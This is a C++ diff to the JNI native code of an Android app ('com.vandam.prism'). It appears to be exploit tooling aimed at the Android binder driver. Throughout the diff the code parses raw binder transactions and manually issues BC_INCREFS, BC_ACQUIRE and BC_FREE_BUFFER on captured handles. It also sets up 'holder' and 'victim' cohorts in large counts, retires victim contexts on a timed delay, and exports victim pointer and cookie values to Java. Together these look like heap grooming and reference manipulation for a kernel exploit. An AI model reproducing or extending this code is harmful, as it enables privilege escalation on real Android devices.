 bool drain_raw_transaction_complete(int fd) {
     auto deadline = std::chrono::steady_clock::now() +
@@ -19004,6 +20255,7 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
             fcntl(fd, F_SETFL, original_flags | O_NONBLOCK) == 0;
     binder_uintptr_t callback_buffer = 0;
     int marker_handle = -1;
+    int target_handle = -1;
     std::uint32_t callback_prefix = 0;
     bool callback_target = false;
     auto deadline = std::chrono::steady_clock::now() +
@@ -19059,21 +20311,38 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
                             transaction.data.ptr.buffer);
                     std::memcpy(&callback_prefix, data,
                             sizeof(callback_prefix));
-                    binder_size_t object_offset = 0;
-                    std::memcpy(&object_offset,
-                            reinterpret_cast<const void*>(
-                                    transaction.data.ptr.offsets),
-                            sizeof(object_offset));
-                    if (object_offset <= transaction.data_size &&
-                            transaction.data_size - object_offset >=
-                                    sizeof(flat_binder_object)) {
+                    std::size_t object_count =
+                            transaction.offsets_size /
+                            sizeof(binder_size_t);
+                    const auto* object_offsets =
+                            reinterpret_cast<const binder_size_t*>(
+                                    transaction.data.ptr.offsets);
+                    for (std::size_t object_index = 0;
+                         object_index < object_count; ++object_index) {
+                        binder_size_t object_offset =
+                                object_offsets[object_index];
+                        if (object_offset > transaction.data_size ||
+                                transaction.data_size - object_offset <
+                                        sizeof(flat_binder_object)) {
+                            marker_handle = -1;
+                            target_handle = -1;
+                            break;
+                        }
                         flat_binder_object object {};
                         std::memcpy(&object, data + object_offset,
                                 sizeof(object));
                         if (object.hdr.type == BINDER_TYPE_HANDLE) {
-                            marker_handle = static_cast<int>(object.handle);
-                            callback_buffer = transaction.data.ptr.buffer;
+                            if (object_index == 0) {
+                                marker_handle =
+                                        static_cast<int>(object.handle);
+                            } else if (object_index == 1) {
+                                target_handle =
+                                        static_cast<int>(object.handle);
+                            }
                         }
+                    }
+                    if (marker_handle > 0) {
+                        callback_buffer = transaction.data.ptr.buffer;
                     }
                 }
             }
@@ -19092,7 +20361,27 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
     std::size_t held_total = 0;
     if (pass && retain_context == JNI_TRUE) {
         if (callback_buffer != 0) {
-            pass = free_buffer(fd, callback_buffer);
+            if (target_handle > 0) {
+                constexpr std::size_t kHandleCommandSize =
+                        sizeof(std::uint32_t) + sizeof(std::uint32_t);
+                constexpr std::size_t kFreeCommandSize =
+                        sizeof(std::uint32_t) +
+                        sizeof(binder_uintptr_t);
+                std::uint8_t commands[
+                        2 * kHandleCommandSize + kFreeCommandSize] {};
+                write_command(commands, BC_INCREFS, &target_handle,
+                        sizeof(target_handle));
+                write_command(commands + kHandleCommandSize,
+                        BC_ACQUIRE, &target_handle,
+                        sizeof(target_handle));
+                write_command(commands + 2 * kHandleCommandSize,
+                        BC_FREE_BUFFER, &callback_buffer,
+                        sizeof(callback_buffer));
+                pass = write_binder_commands(
+                        fd, commands, sizeof(commands)) == 0;
+            } else {
+                pass = free_buffer(fd, callback_buffer);
+            }
             callback_buffer = 0;
         }
     }
@@ -19110,6 +20399,11 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
             route.mapping = mapping;
             route.callback_pointer = callback_identity[0];
             route.callback_cookie = callback_identity[1];
+            route.target_handle = target_handle;
+            if (target_handle > 0) {
+                route.holder_handles.push_back(
+                        static_cast<std::uint32_t>(target_handle));
+            }
             g_retained_raw_routes.push_back(std::move(route));
             retained = true;
             held_total = g_retained_raw_routes.size();
@@ -19132,12 +20426,13 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
             " activity_handle=%d start_exception=%" PRId32
             " start_terminal=%08" PRIx32 " entered=%d nonblocking=%d"
             " callback_target=%d callback_prefix=%08" PRIx32
-            " marker_handle=%d descriptor=%s retained=%d held_total=%zu"
+            " marker_handle=%d target_handle=%d descriptor=%s"
+            " retained=%d held_total=%zu"
             " duration_us=%" PRId64,
             pass ? "pass" : "fail", activity_handle, exception,
             start_reply.terminal_response, entered ? 1 : 0,
             nonblocking ? 1 : 0, callback_target ? 1 : 0,
-            callback_prefix, marker_handle,
+            callback_prefix, marker_handle, target_handle,
             descriptor.empty() ? "none" : descriptor.c_str(),
             retained ? 1 : 0, held_total,
             static_cast<std::int64_t>(duration));
@@ -19145,9 +20440,230 @@ Java_com_vandam_prism_NativeBridge_rawBinderRouteProbe(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_startRawBinderHolderRoutes(
+        JNIEnv* environment, jclass, jstring java_service_template_path,
+        jstring java_start_template_path, jint expected_holders,
+        jint index_sentinel) {
+    const char* service_template_path =
+            java_service_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_service_template_path, nullptr);
+    const char* start_template_path =
+            java_start_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_start_template_path, nullptr);
+    prism::primitive::Result result;
+    bool preflight = service_template_path != nullptr &&
+            start_template_path != nullptr &&
+            (expected_holders == 128 || expected_holders == 256 ||
+             expected_holders == 384 || expected_holders == 512) &&
+            index_sentinel > 0;
+    {
+        std::lock_guard<std::mutex> retained_lock(
+                g_retained_raw_route_mutex);
+        preflight = preflight && g_retained_raw_routes.empty();
+    }
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        preflight = preflight && g_holder_cohort == nullptr;
+        if (preflight) {
+            g_holder_cohort = prism::primitive::HolderCohort::create(
+                    service_template_path, start_template_path,
+                    expected_holders, index_sentinel, &result);
+        }
+    }
+    if (start_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_start_template_path, start_template_path);
+    }
+    if (service_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_service_template_path, service_template_path);
+    }
+    bool pass = preflight && result.passed;
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-holder-routes"
+            " expected=%d core=[%s]",
+            pass ? "pass" : "fail", expected_holders,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_startRawVictimExports(
+        JNIEnv* environment, jclass, jstring java_service_template_path,
+        jstring java_start_template_path, jint expected_victims) {
+    const auto started = std::chrono::steady_clock::now();
+    const char* service_template_path =
+            java_service_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_service_template_path, nullptr);
+    const char* start_template_path =
+            java_start_template_path == nullptr ? nullptr :
+            environment->GetStringUTFChars(
+                    java_start_template_path, nullptr);
+    prism::primitive::Result result;
+    bool preflight = service_template_path != nullptr &&
+            start_template_path != nullptr &&
+            expected_victims == kRawVictimCount - 1;
+    bool cohort_created = false;
+    {
+        std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+        preflight = preflight && g_victim_cohort == nullptr;
+        if (preflight) {
+            g_victim_cohort = prism::primitive::VictimCohort::create(
+                    service_template_path, start_template_path,
+                    expected_victims, &result);
+        }
+        cohort_created = g_victim_cohort != nullptr;
+    }
+    if (start_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_start_template_path, start_template_path);
+    }
+    if (service_template_path != nullptr) {
+        environment->ReleaseStringUTFChars(
+                java_service_template_path, service_template_path);
+    }
+    bool pass = preflight && cohort_created && result.passed;
+    std::uint64_t duration_us = static_cast<std::uint64_t>(
+            std::chrono::duration_cast<std::chrono::microseconds>(
+                    std::chrono::steady_clock::now() - started).count());
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-victim-export-start"
+            " expected=%d duration_us=%" PRIu64 " core=[%s]",
+            pass ? "pass" : "fail", expected_victims, duration_us,
+            result.detail.empty() ? "status=fail reason=preflight" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jlongArray JNICALL
+Java_com_vandam_prism_NativeBridge_collectRawVictimExports(
+        JNIEnv* environment, jclass, jint expected_victims) {
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    bool pass = expected_victims == kRawVictimCount - 1 &&
+            g_victim_cohort != nullptr;
+    std::vector<prism::primitive::VictimToken> core_tokens;
+    prism::primitive::Result collected;
+    if (pass) {
+        collected = g_victim_cohort->collect(&core_tokens);
+        pass = collected.passed && core_tokens.size() ==
+                static_cast<std::size_t>(expected_victims);
+    }
+    std::vector<jlong> tokens;
+    if (pass) {
+        tokens.reserve(static_cast<std::size_t>(expected_victims) * 2);
+        for (const prism::primitive::VictimToken& token : core_tokens) {
+            tokens.push_back(static_cast<jlong>(token.pointer));
+            tokens.push_back(static_cast<jlong>(token.cookie));
+        }
+    }
+    jsize length = pass
+            ? static_cast<jsize>(tokens.size()) : 0;
+    jlongArray result = environment->NewLongArray(length);
+    if (result != nullptr && length > 0) {
+        environment->SetLongArrayRegion(
+                result, 0, length, tokens.data());
+    }
+    return result;
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_queueAndRetireRawVictimContext(
+        JNIEnv* environment, jclass, jint victim) {
+    constexpr useconds_t kRawVictimRetirementSettleUs = 20000;
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    prism::primitive::Result result;
+    if (g_victim_cohort != nullptr) {
+        result = g_victim_cohort->retire(
+                victim, kRawVictimRetirementSettleUs);
+    }
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-client-exit mode=native-context"
+            " victim=%d core=[%s]",
+            result.passed ? "pass" : "fail", victim,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_releaseRawVictimContexts(
+        JNIEnv* environment, jclass, jint expected_victims) {
+    std::lock_guard<std::mutex> lock(g_victim_cohort_mutex);
+    prism::primitive::Result result;
+    bool preflight = expected_victims == kRawVictimCount - 1 &&
+            g_victim_cohort != nullptr;
+    if (preflight) {
+        result = g_victim_cohort->release();
+    }
+    bool pass = preflight && result.passed;
+    g_victim_cohort.reset();
+    char state[640];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-victim-context-release"
+            " expected=%d core=[%s]",
+            pass ? "pass" : "fail", expected_victims,
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
 Java_com_vandam_prism_NativeBridge_releaseRawBinderRouteProbes(
         JNIEnv* environment, jclass) {
     constexpr std::size_t kBinderMappingSize = 1024 * 1024;
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        if (g_holder_cohort != nullptr) {
+            prism::primitive::HolderReleaseReceipt counts;
+            prism::primitive::Result result =
+                    g_holder_cohort->release(&counts);
+            g_holder_cohort.reset();
+            bool pass = result.passed;
+            {
+                std::lock_guard<std::mutex> isolated_lock(
+                        g_raw_isolated_mutex);
+                if (g_raw_isolated_state ==
+                            IsolatedRetirementState::kCollecting ||
+                        g_raw_isolated_state ==
+                            IsolatedRetirementState::kReferencesReleased) {
+                    g_raw_route_release_receipt.generation =
+                            g_raw_isolated_generation;
+                    g_raw_route_release_receipt.contexts = counts.contexts;
+                    g_raw_route_release_receipt.handles = counts.handles;
+                    g_raw_route_release_receipt.death_notifications =
+                            counts.death_notifications;
+                    g_raw_route_release_receipt.mappings = counts.mappings;
+                    g_raw_route_release_receipt.descriptors =
+                            counts.descriptors;
+                    g_raw_route_release_receipt.valid = pass &&
+                            valid_raw_route_release_profile(
+                                    counts.contexts,
+                                    counts.handles,
+                                    counts.death_notifications) &&
+                            counts.mappings == counts.contexts &&
+                            counts.descriptors == counts.contexts;
+                }
+            }
+            char state[640];
+            std::snprintf(state, sizeof(state),
+                    "status=%s stage=raw-binder-route-release"
+                    " retained=%d handles_released=%d"
+                    " deaths_cleared=%d unmapped=%d closed=%d"
+                    " core=[%s]",
+                    pass ? "pass" : "fail", counts.contexts,
+                    counts.handles, counts.death_notifications,
+                    counts.mappings, counts.descriptors,
+                    result.detail.c_str());
+            return environment->NewStringUTF(state);
+        }
+    }
     std::vector<RetainedRawBinderRoute> routes;
     {
         std::lock_guard<std::mutex> lock(g_retained_raw_route_mutex);
@@ -19224,7 +20740,9 @@ Java_com_vandam_prism_NativeBridge_releaseRawBinderRouteProbes(
     {
         std::lock_guard<std::mutex> lock(g_raw_isolated_mutex);
         if (g_raw_isolated_state ==
-                IsolatedRetirementState::kCollecting) {
+                    IsolatedRetirementState::kCollecting ||
+                g_raw_isolated_state ==
+                    IsolatedRetirementState::kReferencesReleased) {
             g_raw_route_release_receipt.generation =
                     g_raw_isolated_generation;
             g_raw_route_release_receipt.contexts =
@@ -19235,9 +20753,11 @@ Java_com_vandam_prism_NativeBridge_releaseRawBinderRouteProbes(
             g_raw_route_release_receipt.mappings = unmapped;
             g_raw_route_release_receipt.descriptors = closed;
             g_raw_route_release_receipt.valid = pass &&
-                    routes.size() == 128 && handles_released == 7360 &&
-                    deaths_cleared == 128 && unmapped == 128 &&
-                    closed == 128;
+                    valid_raw_route_release_profile(
+                            static_cast<int>(routes.size()),
+                            handles_released, deaths_cleared) &&
+                    unmapped == static_cast<int>(routes.size()) &&
+                    closed == static_cast<int>(routes.size());
         }
     }
     char state[320];
@@ -19268,12 +20788,17 @@ Java_com_vandam_prism_NativeBridge_proveRawBinderHoldersRetired(
                         g_raw_isolated_generation &&
                 receipt.generation == g_raw_isolated_generation;
         published = current &&
-                g_raw_isolated_state ==
-                        IsolatedRetirementState::kCollecting &&
-                receipt.valid && contexts == 128 &&
-                callback_deaths == 128 && receipt.contexts == contexts &&
-                receipt.handles == 7360 &&
-                receipt.death_notifications == 128 &&
+                (g_raw_isolated_state ==
+                            IsolatedRetirementState::kCollecting ||
+                        g_raw_isolated_state ==
+                            IsolatedRetirementState::kReferencesReleased) &&
+                receipt.valid && contexts > 0 &&
+                callback_deaths == contexts &&
+                receipt.contexts == contexts &&
+                valid_raw_route_release_profile(
+                        receipt.contexts,
+                        receipt.handles,
+                        receipt.death_notifications) &&
                 receipt.mappings == contexts &&
                 receipt.descriptors == contexts;
         if (published) {
@@ -19314,10 +20839,39 @@ Java_com_vandam_prism_NativeBridge_receiveRawBinderHolderRefs(
     constexpr std::int32_t kFillerMinimum = 20;
     constexpr std::int32_t kFillerVariants = 8;
     const auto started = std::chrono::steady_clock::now();
+    {
+        std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+        if (g_holder_cohort != nullptr) {
+            prism::primitive::Result result =
+                    (expected_holders == 8 || expected_holders == 128 ||
+                     expected_holders == 256 || expected_holders == 384 ||
+                     expected_holders == 512)
+                    ? g_holder_cohort->receive(
+                            expected_holders, fixed_refs_per_holder,
+                            expected_proof, death_object_index)
+                    : prism::primitive::Result {};
+            bool pass = (expected_holders == 8 ||
+                         expected_holders == 128 ||
+                         expected_holders == 256 ||
+                         expected_holders == 384 ||
+                         expected_holders == 512) && result.passed;
+            char state[640];
+            std::snprintf(state, sizeof(state),
+                    "status=%s stage=raw-binder-holder-refs"
+                    " requested=%d death_index=%d core=[%s]",
+                    pass ? "pass" : "fail", expected_holders,
+                    death_object_index,
+                    result.detail.empty()
+                            ? "status=fail reason=cohort" :
+                            result.detail.c_str());
+            return environment->NewStringUTF(state);
+        }
+    }
     std::lock_guard<std::mutex> lock(g_retained_raw_route_mutex);
     bool dynamic_counts = fixed_refs_per_holder == 0;
+    bool interleaved_marker = fixed_refs_per_holder == -1;
     bool counts_valid = expected_holders > 0 && expected_holders <= 128 &&
-            fixed_refs_per_holder >= 0 && fixed_refs_per_holder <= 256 &&
+            fixed_refs_per_holder >= -1 && fixed_refs_per_holder <= 256 &&
             expected_proof > 0 &&
             death_object_index >= -2 &&
             (!dynamic_counts ||
@@ -19341,12 +20895,16 @@ Java_com_vandam_prism_NativeBridge_receiveRawBinderHolderRefs(
     for (std::size_t index = 0;
          index < g_retained_raw_routes.size(); ++index) {
         RetainedRawBinderRoute& route = g_retained_raw_routes[index];
-        std::int32_t expected_count = dynamic_counts
+        std::int32_t expected_count = interleaved_marker
+                ? (index % (expected_holders / 8) == 0 ? 2 : 1)
+                : dynamic_counts
                 ? kFillerMinimum + static_cast<std::int32_t>(index) /
                         (expected_holders / kFillerVariants) +
                         (death_object_index == -1 ? 1 : 2)
                 : fixed_refs_per_holder;
-        int death_index = death_object_index == -2
+        int death_index = interleaved_marker
+                ? (expected_count == 2 ? 1 : -1)
+                : death_object_index == -2
                 ? expected_count - 1 : death_object_index;
         if (death_index >= expected_count) {
             failed_index = static_cast<int>(index);
@@ -19571,5 +21129,40 @@ Java_com_vandam_prism_NativeBridge_receiveRawBinderHolderRefs(
             handles, expected_handles, completions, death_object_index,
             failed_index,
             static_cast<std::int64_t>(duration));
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_releaseRawBinderHolderHandles(
+        JNIEnv* environment, jclass, jint expected_handles,
+        jint expected_deaths) {
+    std::lock_guard<std::mutex> lock(g_holder_cohort_mutex);
+    prism::primitive::Result result;
+    if (g_holder_cohort != nullptr && expected_handles > 0 &&
+            expected_deaths >= 0) {
+        result = g_holder_cohort->release_handles(
+                expected_handles, expected_deaths);
+    }
+    bool ledger = false;
+    if (result.passed) {
+        std::lock_guard<std::mutex> isolated_lock(g_raw_isolated_mutex);
+        ledger = g_raw_isolated_state ==
+                        IsolatedRetirementState::kCollecting &&
+                g_raw_isolated_generation > 0 &&
+                expected_handles == 520 && expected_deaths == 8;
+        if (ledger) {
+            g_raw_isolated_state =
+                    IsolatedRetirementState::kReferencesReleased;
+        } else {
+            g_raw_isolated_state = IsolatedRetirementState::kFailed;
+        }
+    }
+    bool pass = result.passed && ledger;
+    char state[384];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=raw-binder-holder-handle-release core=[%s]",
+            pass ? "pass" : "fail",
+            result.detail.empty() ? "status=fail reason=cohort" :
+                    result.detail.c_str());
     return environment->NewStringUTF(state);
 }
